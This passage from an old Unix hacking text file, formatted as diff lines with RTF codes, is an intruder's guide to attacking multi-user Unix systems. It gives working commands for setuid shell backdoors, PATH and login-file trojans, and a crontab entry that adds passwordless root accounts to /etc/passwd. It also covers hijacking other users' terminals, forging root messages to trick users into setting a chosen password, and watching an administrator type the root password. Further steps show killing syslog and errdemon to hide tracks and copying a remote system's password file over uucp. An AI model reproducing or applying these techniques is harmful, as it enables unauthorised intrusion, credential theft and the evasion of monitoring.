+-----------------------\par
+        This is it, kiddies, the one you've waded through all that rodent \par
+nonsense for! This section will describe advanced hacking techniques. Most of \par
+these techniques are methods of defeating internal security (I.E. security once \par
+you're actually inside the system). There is little to be said on the subject \par
+of hacking into the system itself that hasn't already been said in the earlier \par
+sections on logging in, Unix accounts, and Unix passwords. I will say this \par
+much- it's easier, and faster, to password hack your way from outside the \par
+system into a user account. Once you're actually inside the system, you will \par
+find it, using the techniques described in this section, almost easy to gain \par
+superuser access on most systems. (Not to mention that nothing is quite as \par
+rewarding as spending 3 days hacking the root account on a system, only to \par
+receive the message "not on console-disconnecting" when you finally find the \par
+proper password.) If you do not have a good understanding of the Unix operating \par
+system and some of its more important utilities already, you should read the \par
+earlier parts of this file before going on to this section.\par
+\par
+OVERCOMING RSH RESTRICTIONS\par
+---------------------------\par
+        The rsh (restricted Bourne shell) shell attempts to limit the commands \par
+available to a user by preventing him from executing commands outside of his \par
+searchpath, and preventing him from changing directories. It also prevents you \par
+from changing the value of shell variables directly (i.e. typing \par
+"variable=value"). There are some easy ways to overcome these restrictions.\par
+        You can reference any file and directory in the system by simply using \par
+its full pathname. You can't change directories like this, or execute a file\par
+that is outside of your searchpath, but you can do such things as list out the \par
+contents of directories, edit files in other directories, etc. (If you have \par
+access to the necessary commands.)\par
+        The biggest flaw in rsh security is that the restrictions that are \par
+described above ignored when the account's profile file is executed upon logon. \par
+This means that, if you have access to the edit command, or some other means of \par
+modifying your account's profile, you can add a line to add a directory to your \par
+searchpath, thereby letting you execute any programs in that directory. The \par
+restriction on changing directories is also ignored during logon execution of \par
+the profile. So, if you absolutely, positively HAVE to go to another directory, \par
+you can add a cd command your .profile file.\par
+\par
+OVERCOMING COPY AND WRITE RESTRICTIONS\par
+--------------------------------------\par
+        This is a simple trick. If you have read access t a file, but cannot \par
+copy it because of directory protections, simply redirect the output of the cat \par
+command into another file. If you have write access to a directory but not \par
+write access to a specific file, you can create a copy of the file, modify it \par
+(since it will be owned by your account), delete the original, and rename the \par
+copy to the name of the original.\par
+\par
+DETACHED ACCOUNTS\par
+-----------------\par
+        This is a big security hole in many Unix systems. Occasionally, if a \par
+user is disconnected without logging off, his account may remain on-line, and \par
+still attached to the tty he was connected to the system through. Now, if \par
+someone calls to the system and and gets connected to that tty, he is \par
+automatically inside the system, inside the disconnected user's account. There \par
+are some interesting ways to take advantage of this flaw. For instance, if you \par
+desire to gain the passwords to more account, you can set a decoy program up to \par
+fake the login sequence, execute the program, and then disconnect from the \par
+system. Soon, some unlucky user will call the system and be switched into the \par
+detached account's tty. When they enter their username and password, the decoy \par
+will store their input in a file on the system, display the message "login \par
+incorrect", and then kill the detached account's shell process, thus placing \par
+the user at the real login prompt. A Unix decoy written by Shooting Shark will \par
+be given at the end of this file.\par
+\par
+UID SHELLS\par
+----------\par
+        When the uid bit is set on a shell program, executing this shell will \par
+change your user id to the user id of the account that owns the shell file, and \par
+you will have full use of that account, until you press control-d (ending the \par
+second shell process) and return to your normal user id. This gives you the \par
+power to execute any commands under that account's user id. This is better than \par
+knowing the account's password, since as long as the file remains on the \par
+system, you can continue to make use of that account, even if the password is \par
+changed. When I gain control of an account, I usually make a copy of the shell \par
+while logged in under that account in a nice, out of the way directory, and set \par
+its uid and gid bits. That way, if I should happen to lose the account (for \par
+instance, if the password were changed), I could log in under another account \par
+and still make use of the lost account by executing the uid shell.\par
+\par
+FORCED DETACHING\par
+----------------\par
+        This is an easy means of gaining the use of an account on systems with \par
+the detached account flaw. Usually, most terminal device files will have public \par
+write permission, so that the user that logs in under it can receive messages \par
+via write (unless he turns off messages with the mesg n command). This means \par
+that you can cat a file into the user's terminal device file. A compiled file, \par
+full of all kinds of strange control characters and garbage, works nicely. Say, \par
+the user is logged in on tty03. Just type cat /bin/sh > /dev/tty03. The user \par
+will see something like this on his screen:\par
+\par
+LKYD;uiayh;fjahfasnf kajbg;aev;iuaeb/vkjeb/kgjebg;iwurghjiugj;di vd \par
+b/fujhf;shf;j;kajbv;jfa;vdblwituwoet8y6-\par
+2958ybp959vqvq43p8ytpgyeerv98tyq438pt634956b    v856    -868vcf-56-\par
+e8w9v6bc[6[b6r8wpcvt\par
+\par
+Hehehe! Now, the poor devil is confused. He tries to press break- no response, \par
+and the garbage just keeps coming. He tries to enter various commands, to no \par
+avail. Catting a file into his terminal device file "ties it up", so to speak, \par
+and since this is the file through which all I/O with his terminal is done, he \par
+finds it almost impossible to get any input through to the shell. He can't even \par
+log off! So, in desperation, he disconnects... It is best to execute the cat \par
+command as a background process, so that you can keep an eye on the users on \par
+the system. Usually, the user will call the system back and, unless he gets \par
+switched back into his old detached account (in which case he will usually hang \par
+up again), he will kill the detached account's login process. So, if you see 2 \par
+users on the system using the same username, you know he's logged back in \par
+already. Anyways...after an appropriate length of time, and you feel that he's \par
+disconnected, log off and call the system back a few times until you get \par
+switched into the detached account. Then just create a uid shell owned by the \par
+account and you can use it any time you please, even though you don'tknow the \par
+password. Just remember one thing, though-when the cat command has finished \par
+displaying the compiled file on the victim's screen, if he is still logged on \par
+to that terminal, he will regain control. Use a long file!\par
+\par
+FAKING WRITE MESSAGES\par
+---------------------\par
+        Being able to write to other people's terminal files also makes it \par
+possible to fake write messages from any user on the system. For example, you \par
+wish to fake a message from root. Edit a file to contain these lines:\par
+Message from root console ^g [note control-g (bell) character]\par
+Bill, change your password to "commie" before logging off today. There has been \par
+a security leak.\par
+<EOF>  [don't forget to put this-<EOF>-in the file.]\par
+Now, type "who" to find bill's tty device, and type:\par
+\par
+cat [filename] > /dev/ttyxx\par
+\par
+Bill will see:\par
+\par
+Message from root console [beep!]\par
+Bill, change your password to "commie" before logging off today. There has been \par
+a security leak.\par
+<EOF>\par
+\par
+WHEN FILE PERMISSIONS ARE CHECKED\par
+---------------------------------\par
+        Unix checks file permissions every time you issue a write or execute \par
+command to a file. It only checks read permissions, however, when you first \par
+issue the read command. For instance, if you issued the command to cat the \par
+contents of a file, and someone changed the file's permissions so that you did \par
+not have read permission while the process was still being executed, the cat \par
+command would continue as normal.\par
+\par
+ONLINE TERMINAL READING\par
+-----------------------\par
+        You can also, if you have some means of assuming an account's userid, \par
+(such as having a uid shell for that account), you can read the contents of \par
+someone's terminal on-line. Just execute the uid shell and type "cat \par
+/dev/ttyxx &" (which will execute the cat command in the background, which will \par
+still display the contents to your screen, but will also allow you to enter \par
+commands). Once the person logs off, ownership of his terminal device file will \par
+revert to root (terminal device files are temporarily owned by the account \par
+logged in under them), but since you had the proper permissions when you \par
+started the read process, you can still continue to view the contents of that \par
+terminal file, and can watch, online, as the next use logs in. There is also \par
+one other trick that can sometimes be used to gain the root password, but \par
+should be exercised as a last resort, since it involved revealing your identity \par
+as a hacker to the superuser. On many systems, the superuser also has a normal \par
+user account that he uses for personal business, and only uses the root account \par
+for system management purposes. (This is, actually, a rather smart security \par
+move, as it lessens the chances of, say, things like his executing a trojan \par
+horse program while under the root account, which, to say the least, could be \par
+disastrous [from his point of view].) If you can obtain a uid shell for his \par
+user account, simply execute a read process of his terminal file in the \par
+background (while under the uid shell), and then drop back into your normal \par
+shell. Then send him a write message like:\par
+\par
+I'm going to format your winchesters\par
+\par
+When he uses the su command to go to the superuser account to kick you off the \par
+system, you can sit back and watch him type in the root password. (This should \par
+only be done if you have more than one account on the system- remember, many \par
+systems will not let you log into a superuser account remotely, and if the only \par
+account you have is a superuser account, you are effectively locked out of the \par
+system.)\par
+\par
+MAIL FRAUD\par
+----------\par
+        The TCP/IP protocol is a common protocol for file transfers between \par
+Unix systems, and between Unix and other operating systems. If the Unix system \par
+you are on features TCP/IP file transfers, it will have the telnet program on-\par
+line, usually in the directory /bin.  This can be used to fake mail from any \par
+user on the system. Type "telnet" to execute the telnet program. You should \par
+see:\par
+\par
+Telnet>\par
+\par
+At this prompt, type "open [name] 25", where name is the uucp network name of \par
+the system you are on. This will connect you to the system's 25th port, used to \par
+receive network mail. Once connected, type:\par
+\par
+rcpt to: [username]\par
+\par
+Where username is the name of the user you wish to send mail to. Next, type:\par
+\par
+mail from: [user]\par
+\par
+Where user is the name of the use you wish the mail to appear from. You can \par
+also specify a non-existant user. You can also fake network mail from a user on \par
+another system. For information on the format of the address, see the section \par
+on the uucp facilities. Then type:\par
+\par
+data\par
+\par
+You will be prompted to enter the message. Enter "." on a blank line to end and \par
+send the mail. When you'e finished sending mail, type "quit" to exit.\par
+\par
+        Thanks to Kid&CO. from Private Sector/2600 Magazine for that novel bit \par
+of information.\par
+\par
+UNIX TROJAN HORSES\par
+------------------\par
+        This is an old, OLD subject, and there's little original material to \par
+add about it. Trojan horses are programs that appear to execute one function, \par
+but actually perform another. This is perhaps the most common means of hacking \par
+Unix.\par
+        One of the easiest means of setting up a Unix trojan horse is to place \par
+a program named after a system command, such as ls, "in the way" of someone's \par
+search path. For instance, if a user's searchpath is ".:/usr/bin", which means \par
+that the system searches the user's current directory for a command first, you \par
+could place a shell script in the user's home directory called "ls" that, when \par
+executed, created a copy of the shell, set the new shell file's uid and gid \par
+bits, echo an error message (such as "lsa: not found", leading the user to \par
+think he mistyped the command and the offending character was not echoed, due \par
+to line noise or whatever), and delete itself. When the user executes the ls \par
+command in his directory, the uid shell is created. Another good idea is to set \par
+the name of the trojan to a command in the user's login file, have it make the \par
+uid shell, execute the real command, and then delete itself.\par
+        Another good way to set up a trojan horse is to include a few lines in \par
+a user's login file. Simply look at the user's password file entry to find out \par
+which shell he logs in under, and then modify the appropriate login file (or \par
+create one if it doesn't exist) to create a uid shell when the user logs on.\par
+        If you can modify a user's file in the directory \par
+/usr/spool/cron/crontabs, you can add an entry to create a uid shell. Just \par
+specify * * * * * as the times, and wait about 1-2 minutes. In 1 minute, the \par
+cron utility will execute the commands in the user's crontab file. Then you can \par
+delete the entry. Again, if the user doesn't have a file in \par
+/usr/spool/cron/crontabs, you can create one.\par
+        One last note- be sure you give the trojan horse execute permissionsm, \par
+otherwise the victim will receive the message "[filename]- cannot execute"... \par
+Kind of a dead giveaway.\par
+CHANGING UID PROGRAMS\par
+---------------------\par
+        If you have write access to a uid file, you can easily modify it to \par
+become a shell. First, copy the file. Then type:\par
+\par
+cat /bin/sh > [uid file]\par
+\par
+This will replace the file's contents with a shell program, but the uid bit \par
+will remain set. Then execute the file and create a well-hidden uid shell, and \par
+replace the subverted uid file with the copy.\par
+\par
+ADDING AN ACCOUNT TO A UNIX SYSTEM\par
+----------------------------------\par
+        To add an account to a Unix system, you must have write access to the \par
+password file, or access to the root account so that you can change the \par
+password file's protections. To add an account, simply edit the file with the \par
+text file editor, edit (or any of the other Unix editors, if you wish). Add an\par
+entry like this:\par
+\par
+[username]::[user#]:[group#]:[description]:[home directory]:[pathname of shell]\par
+\par
+Notice that the password field is left blank. To set the password, type:\par
+\par
+passwd [username]\par
+\par
+You will then be prompted to enter and verify a password for the account.\par
+If you wish the account to have superuser privileges, it must have a user \par
+number of zero.\par
+UNIX BACKDOOR\par
+-------------\par
+        A backdoor is a means of by-passing a system's normal security for \par
+keeping unauthorized users out. For all the talk about back doors, they are \par
+rarely accomplished. But creating a backdoor in Unix System V is really quite \par
+easy. It simply requires adding a few entries to the file \par
+/usr/lib/crontab or /usr/spool/cron/crontabs/root. (Again, if the file doesn't \par
+exist, you can create it.) Add these lines, which will create 2 accounts on the\par
+system, one a user account ("prop") and one a superuser account ("prop2"), at\par
+1 am system time every night, and delete them at 2 am every night.\par
+\par
+0 1 * * * chmod +w /etc/passwd\par
+1 1 * * * echo "prop::1:1::/:/bin/sh" >> /etc/passwd\par
+2 1 * * * echo "prop2::0:0::/:/bin/sh" >> /etc/passwd\par
+20 1 * * * grep -v "prop*:" /etc/passwd > /usr/spool/uucppublic/.p\par
+0 2 * * * cat /usr/spool/uucppublic/.p > /etc/passwd\par
+10 2 * * * chmod -w /etc/passwd\par
+15 2 * * * rm /usr/spool/uucppublic/.p\par
+\par
+COVERING YOUR TRACKS\par
+--------------------\par
+        Naturally, you want to keep your cover, and not leave any trace that \par
+there is a hacker on the system. This section will give you some tips on how to \par
+do just that. First of all, the Unix system keeps track of when a file was last \par
+modified (see the information on the command ls -l in the section on file and \par
+directory protections). You don't want anyone noticing that a file has been \par
+tampered with recently, so after screwing around with a file, if at all \par
+possible, you should return its last modified date to its previous value using \par
+the touch command. The syntax for the touch command is:\par
+\par
+touch hhmmMMdd [file]\par
+\par
+Where hh is the hour, mm is the minute, MM is the month, and dd is the day. \par
+[file] is the name of the file you wish to change the date on.\par
+        What usually gives hackers away are files they create on a system. If \par
+you must create files and directories, make use of the hidden files feature. \par
+Also, try to hide them in directories that are rarely "ls"'d, such as \par
+/usr/spool/lp, /usr/lib/uucp, etc (in other words, directories whose contents \par
+are rarely tampered with).\par
+        Avoid use of the mail facilities, as anyone with the proper access can \par
+read the /usr/mail files. If you must send mail to another hacker on the \par
+system, write the message into a text file first, and encrypt it. Then mail it \par
+to the recipient, who can save the message without the mail header using the w \par
+option, and decrypt it.\par
+        Rather than adding additional superuser accounts to a system, I've \par
+found it better to add simple user accounts (which don't stand out quite as \par
+much) and use a root uid shell (judiciously hidden in a rarely used directory) \par
+whenever I need superuser privileges. It's best to use a user account as much \par
+as possible, and only go to the superuser account whenever you absolutely need \par
+superuser priv's. This may prevent damaging accidents. And be careful when \par
+creating a home directory for any accounts you add. I've always found it better \par
+to use existing directories, or to add a hidden subdirectory to a little-\par
+tampered with directory.\par
+\par
+        Many systems have "watchdog" programs which log off inactive accounts \par
+after a certain period of time. These programs usually keep logs of this kind \par
+of activityl. Avoid sitting on the sitting doing nothing for long periods of \par
+time.\par
+        While using some of the methods described in this file, you may replace \par
+a user's file with a modified copy. This copy will be owned by your account and \par
+group instead of the account which owned the original. You can change the group \par
+back to the original owner's group with the chgrp command, the format of which \par
+is:\par
+\par
+chgrp [groupname] [file]\par
+\par
+And change the owner back to the original with the chown command:\par
+\par
+chown [user] [file]\par
+\par
+        When you change ownership or group ownership of a file, the uid and gid \par
+bits respectively are reset, so you can't copy the shell, set its uid bit, and \par
+change its owner to root to gain superuser capabilities.\par
+        Above all, just be careful and watch your step! Unix is a very flexible \par
+operating system, and even though it comes equipped with very little in the way \par
+of accounting, it is easy to add your own security features to it. If you do \par
+something wrong, such as attempting to log in under a superuser account \par
+remotely only to see "not on console-goodbye", assume that a note is made of \par
+the incident somewhere on the system. Never assume that something [anything!] \par
+won't be noticed. And leave the system and its files exactly as you found them. \par
+In short, just use a little common sense.\par
+        If you're a real klutze, you can turn off the error logging (if you \par
+have root capabilities). I will include information on System V error logging, \par
+which most Unix clones will have error logging facilities similar to, and on \par
+Berkely Standard Distribution (BSD) Unix error logging.\par
+\par
+BERKELY (BSD) UNIX ERROR LOGGING\par
+--------------------------------\par
+Type "cat /etc/syslog.pid". This file contains the \par
+process number of the syslog (error logging) program. Kill this process, and \par
+you stop the error logging. Remember to start the logging process back up after \par
+you're through stumbling around. \par
+        If you want to see where the error messages are sent, type:\par
+\par
+cat /etc/syslog.config\par
+\par
+Entries are in the form:\par
+\par
+#file\par
+\par
+Such as:\par
+\par
+5/etc/errlogfile\par
+\par
+The number is the priority of the error, and the file is the file that errors \par
+of that priority or higher are logged to. If you see an entry with /dev/console \par
+as its log file, watch out! Errors of that priority will result in an error \par
+message being displayed on the system console. Sometimes, a list of usernames \par
+will follow an entry for errorlogging. This means that these users will be \par
+notified of any priorities of that level or higher.\par
+There are 9 levels of priority to errors, and an estimation of their \par
+importance:\par
+\par
+9       -Lowly errors. This information is just unimportant junk used to debug\par
+        small errors in the system operation that usually won't affect its\par
+        performance. Usually discarded without a glance.\par
+\par
+8       -Usually just thrown away. These messages provide information on the\par
+        system's operation, but nothing particularly useful.\par
+\par
+7       -Not greatly important, but stored for informational purposes.\par
+\par
+6       -System errors which can be recovered from.\par
+\par
+5       -This is the priority generally given to errors caused by hackers-\par
+        not errors, but important information, such as security violatins:\par
+        bad login and su attempts, attempts to access files without proper\par
+        permissions, etc.\par
+\par
+4       -Errors of higher priority than 6.\par
+\par
+3       -Major hardware and software errors.\par
+\par
+2       -An error that requires immediate attention...very serious.\par
+\par
+1       -***<<<(((CRAAASSSHHH!!!)))>>>***-\par
+\par
+SYSTEM V ERROR LOGGING\par
+----------------------\par
+        System V error logging is relatively simple compared to Berkely Unix \par
+error logging. The System V error logging program is errdemon. To find the \par
+process id of the error logging program, type "ps -uroot". This will give you a \par
+list of all the processes run under the root id. You will find /etc/errdemon \par
+somewhere in the list. Kill the process, and no more error logging. The \par
+errdemon program is not as sophisticated as BSD Unix's syslog program: it only \par
+logs all errors into a file (the default file is /usr/adm/errfile, but another \par
+file can be specified as an argument to the program when it is started). \par
+Errdemon does not analyze the errors as syslog does, it simply takes them from \par
+a special device file called /dev/error and dumps them into the error logging \par
+file. If you wish to examine the error report, use the errpt program, which \par
+creates a report of the errors in the error logging file and prints it out on \par
+the stanard output. The format is: errpt [option] [error logging file]. For a \par
+complete report of all errors, use the -a option:\par
+\par
+errpt -a /usr/adm/errfile\par
+\par
+The output is very technical, however, and not of much use to the hacker.\par
+\par
+UUCP NETWORKING\par
+---------------\par
+        This section will cover the workings and use of the Unix uucp \par
+facilities. UUCP stands for Unix to Unix Copy. The uucp utilities are for the \par
+exchange of files between Unix systems. There also facilities for users to dial \par
+out and interact with remote systems, and for executing limited commands on \par
+remote systems without logging in.\par
+\par
+OUTWARD DIALING\par
+---------------\par
+        The command for outward dialing is cu. The format is:\par
+\par
+cu -n[phone number]\par
+\par
+Such as:\par
+\par
+cu -n13125285020\par
+\par
+On earlier versions of Unix, the format was simply "cu [phone number]".\par
+\par
+Note, that the format of the phone number may be different from system to \par
+system- for instance, a system that dials outward off of a pbx may need to have \par
+the number prefixed by a 9, and one that uses an extender may not need to have \par
+the number (if long distance) preceded by a 1. To dial out, however, the system \par
+must have facilities for dialing out. The file /usr/lib/uucp/Devices (called \par
+L-devices on earlier systems) will contain a list of the available dialout \par
+devices. Entries in this file are in the format:\par
+\par
+[device type]  [device name]  [dial device]  [linespeed]  [protocol, optional]\par
+\par
+Device type is one of 2 types: ACU and DIR. If ACU, it is a dialout device. DIR \par
+is a direct connection to a specific system.  Device name is the name of the \par
+base name of the dialout device's device file, which is located in the /dev \par
+directory. Dial device is usually an unused field. It was used on older systems \par
+where one device (device name in the above example) was used to exchange data, \par
+and another device (dial device, above) did the telephone dialing. In the age \par
+of the autodial modem, this is a rarely used feature. The next, linespeed, is \par
+the baud rate of the device, usually either 300, 1200, or 2400, possibly 4800 \par
+or 9600 if the device is a direct connection. The protocol field is for \par
+specifying the communications protocol. This field is optional and generally \par
+not used. Here is an example entry for a dialout device and a direct \par
+connection:\par
+\par
+ACU  tty99  unused  1200\par
+DIR  tty03  unused  9600\par
+\par
+If a dialout device is capable of more than one baud rate, it must have 2 \par
+entries in the Devices (L-devices) file, one for each baud rate. Note, that the \par
+device in the above example is a tty- usually, dialout device names will be in \par
+the form tty##, as they can be used both for dialing out, and receiving \par
+incoming calls. The device can be named anything, however.\par
+\par
+There are several options worth mentioning to cu:\par
+-s      Allows you to specify the baud rate. There must be a device in the\par
+        Devices file with this speed.\par
+-l      Allows you to specify which device you wish to use.\par
+\par
+If you wish to connect to a system that there is a direct connection with, \par
+simply type "cu -l[device]". This will connect you to it. You can also do that \par
+do directly connect to a dialout device, from which point, if you know what \par
+commands it accepts, you can give it the dial commands directly.\par
+\par
+Using the cu command is basically the same as using a terminal program. When \par
+you use it to connect to a system, you then interact with that system as if you \par
+dialed it directly from a terminal. Like any good terminal program, the cu \par
+"terminal program" provides facilities for file transfers, and other commands. \par
+Here is a summary of the commands:\par
+\par
+~.                 -Disconnect from the remote system.\par
+\par
+~!                 -Temporarily execute a shell on the local system. When you \par
+                   wish to return to the remote system, press control-D.\par
+\par
+~![cmd]            -Execute a command on the local system. Example: ~!ls -a\par
+\par
+~$[cmd]            -Execute a command on the local system and send the output to\par
+                   the remote system.\par
+\par
+~%put f1 f2        -Sends a file to the remote system. F1 is the name of the\par
+                   file on the local system, and f2 is the name to be given the\par
+                   copy made on the remote system.\par
+\par
+~take f1 f2        -Copies a file from the remote to the local system. F1 is\par
+                   the name of the remote file, and f2 is the name to be given\par
+                   to the local copy.\par
+\par
+Note, that the commands for transferring output and files will only work if you \par
+are communicating with another Unix system.\par
+        You may be wondering how you can find out the format for the phone \par
+number, which is necessary to dial out. The format can be obtained from the \par
+file /usr/lib/uucp/Systems (called L.sys on earlier Unix systems). This file \par
+contains the uucp network names and phone numbers of other Unix systems, as \par
+well as other information about them. This file contains the information needed \par
+to carry out uucp file transfers with the systems listed within it. The entries \par
+are in the format:\par
+\par
+[system name]  [times]  [devicename]  [linespeed]  [phone number]  [login info]\par
+\par
+System name is the name of the system.\par
+Times is a list of the times when the system can be contacted. This field will \par
+usually just have the entry "Any", which means that the system can be contacted \par
+at any time. Never means that the system can never be called. You can also \par
+specify specific days and times when the system can be contacted. The days are \par
+abbreviated like this:\par
+Su Mo Tu We Th Fr Sa\par
+Where Su is Sunday, Mo is Monday, etc. If the system can be called on more than \par
+one day of the week, you can string the days together like this:SuMoTu for \par
+Sunday, Monday, and Tuesday. You can also specify a range of hours when the \par
+system can be called, in the 24 hour format, like this: Su,0000-0100 means that \par
+the system can be called Sunday from midnight to 1am. The week days (Monday \par
+through Friday) can be abbreviated as Wk.\par
+Device name is the name of the device to call the system with. If the system is \par
+directly connected, this file will contain the base name of the device file of \par
+the device which connects it to the local system. If the system has to be \par
+dialed over the phone, this field will be "ACU".\par
+Linespeed is the baud rate needed to connect to the system. There must be a \par
+device available with the specified baud rate to contact the system.\par
+Phone number is the phone number of the system. By looking at these entries, \par
+you can obtain the format for the phone number. For instance, if this field \par
+contained "913125285020" for an entry, you would know that the format would be \par
+9+1+area code+prefix+suffix. \par
+The login field contains information used for uucp transfers, and will be \par
+discussed in detail later.\par
+        Sometimes you will see alphabetic or other strange characters in the \par
+phone number field. Sometimes, these may be commands for the particular brand \par
+of modem that the system is using to dialout, but other times, these may \par
+actually be a part of the phone number. If so, the meaning of these characters \par
+called tokens can be found in the file /usr/lib/uucp/Dialcodes (called\par
+L-dialcodes on earlier systems). Entries in this file are in the form:\par
+\par
+token   translation\par
+\par
+For example:\par
+\par
+chicago  312\par
+\par
+Would mean that the token chicago means to dial 312. So, if the phone number \par
+field of a Systems entry was:\par
+\par
+chicago5285020\par
+\par
+It would mean to dial 3125285020.\par
+\par
+You can add an entry to the Systems file for systems that you wish to call \par
+frequently. Simply edit the file using one of the Unix system's editors, and \par
+add an entry like this:\par
+\par
+ripco  Any ACU 1200 13125285020 unused\par
+\par
+And then any time you wished to call the BBS Ripco, you would type:\par
+\par
+cu ripco\par
+\par
+And the system would do the dialing for you, drawing the phone number from the \par
+entry for Ripco in the Systems file.\par
+\par
+HOW UUCP TRANSFERS WORK\par
+-----------------------\par
+        This section will detail how a uucp file transfer works. When you issue \par
+the command to transfer a file to/from a remote system, the local system dials \par
+out to the remote system. Then, using the information contained in the login \par
+field of the Systems file, it logs into an account on the remote system, in \par
+exactly the same manner as you would log into a Unix system. Usually, however, \par
+uucp accounts use a special shell, called uucico, which implements certain \par
+security features which (are supposed to) keep the uucp account from being used \par
+for any other purpose than file transfers with another Unix system. (Note: not \par
+ALL uucp accounts will use this shell.) If you've ever logged into the uucp \par
+account on the system and received the message, "Shere=[system name]", and the \par
+system wouldn't respond to any of your input, that account was using the uucico \par
+shell, which prevents the account from being used as a normal "user" account. \par
+The local system then requests the transfer, and if security features of the \par
+remote system which will be discussed later do not prevent the transfer, the \par
+file will be copied to (or from if you requested to send a file) the local \par
+system. The account is then logged off of the remote system, and the connection \par
+is dropped.\par
+\par
+ADDING A LOGIN FIELD TO A SYSTEMS ENTRY\par
+--------------------------------------\par
+        Many superusers feel that if the uucp account uses the uucico shell, \par
+that it is "secure". Because of this, they may ignore other uucp security \par
+measures, and probably not give the account a password. If you find such a \par
+system, you can add an entry for the system to the Systems (L.sys) file of \par
+another Unix system and try to, say, transfer a copy of its password file. To \par
+do so, simply follow the outline in the section on cu for how to add an entry \par
+to the Systems file. That will cover everything but how to add the login field, \par
+which is covered in this section. \par
+        The login section consists of expect/sendsubfields. For example, here \par
+is an example login field:\par
+\par
+ogin: uucp assword: uucp\par
+\par
+The first subfield is what is expected from the remote system, in this case \par
+"ogin:". This means to expect the login prompt, "Login:". Note, that you do not \par
+have to enter the complete text that the remote system sends, the text sent \par
+from the remote system is scanned left to right as it is sent until the \par
+expected text is found. The second subfield contains the local system's \par
+response, which is sent to the remote system. In this case, the local system \par
+sends "uucp" when it receives the login prompt. Next, the local system scans \par
+the output from the remote system until it receives "assword:" ("password:"), \par
+then sends "uucp" (the password, in this example, for the uucp account). \par
+Because of line noise or other interference, when the local system connects to \par
+the remote, it may not receive the expected string. For this possibility, you \par
+may specify the expected string several times, like this:\par
+\par
+ogin:-ogin: uucp assword:-assword: uucp\par
+\par
+The - separates that if the expected string is not received, to expect the \par
+string specified after the hyphen. Sometimes, you may need to send a special \par
+character, such as kill or newline, to the system if the expected string is not \par
+received. You can do that like this:\par
+\par
+ogin:-BREAK-ogin: uucp assword: uucp\par
+\par
+The -BREAK- means that if ogin: isn't received the first time, to send a break \par
+signal to the remote system, and then expect ogin: again. Other common entries \par
+are:\par
+\par
+ogin:-@-ogin:           Send a kill character if the expected string isn't\par
+                        received the first time.\par
+ogin:-EOT-ogin:         Send a control-D if the expected string isn't received.\par
+ogin:--ogin:            Send a null character if the expected string isnt' \par
+                        received.\par
+\par
+If the system you wish to transfer files with doesn't send anything when you \par
+first connect to it, (say, you have to press return first), the first expect \par
+entry should be "" (nothing), and the first send field should be \\r (a return \par
+character). There are certain characters, like return, which are represented by \par
+certain symbols or combinations of characters. Here is a list of these:\par
+\par
+\\r              -Return.\par
+@               -Kill.\par
+-               -Null/newline character.\par
+""              -Nothing.\par
+\par
+UNUSUAL LOGIN ENTRIES\par
+---------------------\par
+        Sometimes, the login entry for a system might contain more than just \par
+fields to expect the login prompt, send the username, expect the password \par
+prompt, and send the password. For instance, if you have to go through a \par
+multiplexer to get to the system, the login field would contain a subfield to \par
+select the proper system from the multiplexer.\par
+        Sometimes, on systems, that use the Hayes smartmodem to dial out, the \par
+phone number field may be left unused (will contain an arbitrary entry, such as \par
+the word "UNUSED"), and the dialing command will be contained in the login \par
+field. For example:\par
+\par
+ripco  Any ACU 1200 UNUSED  "" ATDT13125285020 CONNECT \\r ernumber: new\par
+\par
+So, when you try to transfer a file with a Unix system called "ripco":\par
+"UNUSED" is sent to the Hayes smartmodem. Of course, this is not a valid Hayes \par
+command, so it is ignored by the modem. Next, the system moves the login field. \par
+The first expect subfield is "", which means to expect nothing. It then sends \par
+the string "ATDT13125285020", which is a Hayes dialing comand, which will make \par
+the modem dial 13125285020. When the string "CONNECT" is received (which is \par
+what the smartmodem will respond with when it connects), the system sends a \par
+carriage return and waits for the "Usernumber:" prompt. When it receives that, \par
+it sends "new". This completes the login.\par
+\par
+UUCP SYNTAX\par
+-----------\par
+        Once you've completed an entry for the Unix system you wish to transfer \par
+files with, you can issue the uucp command, and attempt the transfer. The \par
+syntax to copy a file from the remote system is:\par
+\par
+uucp remote![file pathname] [local pathname]\par
+\par
+Where remote is the name of the system you wish to copy the file from, [file \par
+pathname] is the pathname of the file you wish to copy, and [local pathname] is \par
+the pathname of the file on the local system that you wish to name the copy \par
+that is made on the local system.\par
+To transfer a file from the local system to the remote system, the syntax is:\par
+\par
+uucp [local pathname] remote![file pathname]\par
+\par
+Where [local pathname] is the file on the local system that you wish to \par
+transfer to the remote system, remote is the name of the remote system, and \par
+[file pathname] is the pathname you wish to give to the copy to be made on the \par
+remote system. \par
+\par
+So, to copy the ripco system's password file, type:\par
+\par
+uucp ripco!/etc/passwd /usr/spool/uucppublic/ripcofile\par
+\par
+Which will, hopefully, copy the password file from ripco into a file on the \par
+local system called /usr/spool/uucppublic/ripcofile. The directory \par
+/usr/spool/uucppublic is a directory set up especially for the reception of \par
+uucp-transferred files, although you can have the file copied to any directory \par
+(if the directory permissions don't prevent it).\par
+\par
+DEBUGGING UUCP PROCEDURES\par
+-------------------------\par
+        So, what if your transfer did not go through? Well, this section will \par
+detail how to find out what went wrong, and how to correct the situation.\par
+\par
+UULOG\par
+-----\par
+        The uulog command is used to draw up a log of transactions with remote \par
+systems. You can either draw up the entries by system name, or the name of the \par
+user who initiated the transaction.\par
+For our purposes, we only want to draw up the log by system name. The format \par
+is:\par
+\par
+uulog -s[system name]\par
+\par
+Now, this will pull up the logs for ALL transactions with this particular \par
+system. We only want the logs for the last attempted transaction with the \par
+system. Unfortunately, this can't be done, you'll just have to sort through the \par
+logs until you reach the sequence of the last transaction. If the logs extend \par
+back a long time, say about a week, however, you can use the grep command to \par
+call up the logs only for a certain date:\par
+\par
+uulog -s[system] | grep mm/dd-\par
+\par
+Where mm is the month (in the form ##, such as 12 or 01) and dd is the day, in \par
+the same form). This takes the output of the uulog command, and searches \par
+through it with the grep command and only prints out those entries which \par
+contain the date the grep command is searching for. The log entries will be in \par
+the form:\par
+\par
+[username] [system] (month/day-hour:minute-pid) DESCRIPTION\par
+\par
+Where:\par
+\par
+username        -Is the userid of the account that initiated the transaction.\par
+system          -Is the name of the system that the transaction was attempted\par
+                with.\par
+month/day       -Date of transaction.\par
+hour:minute     -Time of transaction.\par
+job number      -The transfer's process id.\par
+DESCRIPTION     -The log message.\par
+\par
+An example of a typical log entry:\par
+\par
+root ripco (11/20-2:00-1234) SUCCEEDED (call to ripco)\par
+\par
+In the above example, the root account initiated a transaction with the Ripco \par
+system. The system was contacted on November 20, at 2:00. The job number of the \par
+transaction is 1234.\par
+\par
+Here is an explanation of the various log messages you will encounter, and \par
+their causes:\par
+\par
